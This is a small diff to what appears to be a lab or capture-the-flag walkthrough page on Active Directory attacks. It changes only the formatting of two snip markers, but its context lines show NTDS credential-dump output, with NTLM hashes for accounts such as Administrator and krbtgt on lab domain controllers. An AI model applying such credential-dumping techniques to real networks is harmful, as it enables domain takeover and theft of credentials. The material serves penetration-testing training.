@@ -105,7 +105,7 @@ htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
 DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-...[SNIP]...
+---[SNIP]---
 [*] Cleaning up...
 ```
 
@@ -124,7 +124,7 @@ SMB         172.16.1.5      445    DC01             [+] CORP.LOCAL\WEB01$:7ddf32
 SMB         172.16.1.5      445    DC01             [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
 SMB         172.16.1.5      445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
 SMB         172.16.1.5      445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:ac2b5f88fc33b7b9e0682be85784ec0d:::
-...[SNIP]...
+---[SNIP]---
 ```
 
 {{< /tabcontent >}}
